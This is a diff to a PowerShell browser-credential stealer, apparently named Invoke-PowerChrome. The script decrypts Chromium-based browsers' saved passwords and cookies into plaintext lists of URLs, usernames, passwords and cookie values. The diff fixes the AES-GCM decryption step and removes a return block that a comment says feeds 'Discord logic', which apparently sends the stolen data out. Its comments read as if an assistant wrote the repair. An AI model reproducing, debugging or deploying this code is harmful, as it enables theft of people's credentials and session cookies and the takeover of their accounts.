@@ -891,19 +891,22 @@ if (-not ($Browser)){
     }
 
 # ------------------------------------------------------------------
-    # 4. DECRYPT EVERYTHING 
+    # 4. DECRYPT EVERYTHING (Direct Decryption Fix)
     # ------------------------------------------------------------------
     $DecryptedLogins = @()
     foreach ($Entry in $BrowserData) {
         try {
             $RawData = [Convert]::FromBase64String($Entry.Base64EncryptedPassword)
+            # v10 header (3) + Nonce (12) + Ciphertext + Tag (16)
             $Nonce = $RawData[3..14]
-            $Ciphertext = $RawData[15..($RawData.Length - 17)]
             $Tag = $RawData[($RawData.Length - 16)..($RawData.Length - 1)]
+            $Ciphertext = $RawData[15..($RawData.Length - 17)]
             
-            # Using the correct function name: DecryptWithAesGcm
+            # Using your script's specific AES-GCM logic
             $PassBytes = DecryptWithAesGcm -Key $MasterKey -Iv $Nonce -Ciphertext $Ciphertext -Tag $Tag
-            $Pass = [Text.Encoding]::UTF8.GetString($PassBytes)
+            if ($null -eq $PassBytes) { throw "Decryption returned null" }
+            
+            $Pass = [System.Text.Encoding]::UTF8.GetString($PassBytes)
             $DecryptedLogins += [PSCustomObject]@{ URL = $Entry.URL; User = $Entry.Username; Pass = $Pass }
         } catch { 
             $DecryptedLogins += [PSCustomObject]@{ URL = $Entry.URL; User = $Entry.Username; Pass = "(Decryption Failed)" }
@@ -915,25 +918,18 @@ if (-not ($Browser)){
         try {
             $RawData = [Convert]::FromBase64String($C.Base64EncryptedValue)
             $Nonce = $RawData[3..14]
-            $Ciphertext = $RawData[15..($RawData.Length - 17)]
             $Tag = $RawData[($RawData.Length - 16)..($RawData.Length - 1)]
+            $Ciphertext = $RawData[15..($RawData.Length - 17)]
             
-            # Using the correct function name: DecryptWithAesGcm
             $ValBytes = DecryptWithAesGcm -Key $MasterKey -Iv $Nonce -Ciphertext $Ciphertext -Tag $Tag
-            $Val = [Text.Encoding]::UTF8.GetString($ValBytes)
+            if ($null -eq $ValBytes) { throw "Decryption returned null" }
+
+            $Val = [System.Text.Encoding]::UTF8.GetString($ValBytes)
             $DecryptedCookies += [PSCustomObject]@{ Host = $C.Host; Name = $C.Name; Value = $Val }
         } catch {
             $DecryptedCookies += [PSCustomObject]@{ Host = $C.Host; Name = $C.Name; Value = "(Decryption Failed)" }
         }
     }
-    # ------------------------------------------------------------------
-    # 5. RETURN THE HASHTABLE (What the Discord logic expects)
-    # ------------------------------------------------------------------
-    return @{
-        Logins  = $DecryptedLogins
-        Cookies = $DecryptedCookies
-    }
-}
 # 1. Trigger the function with a valid browser name (Chrome, Edge, or Chromium)
 $Output = Invoke-PowerChrome -Browser Chrome -HideBanner
 
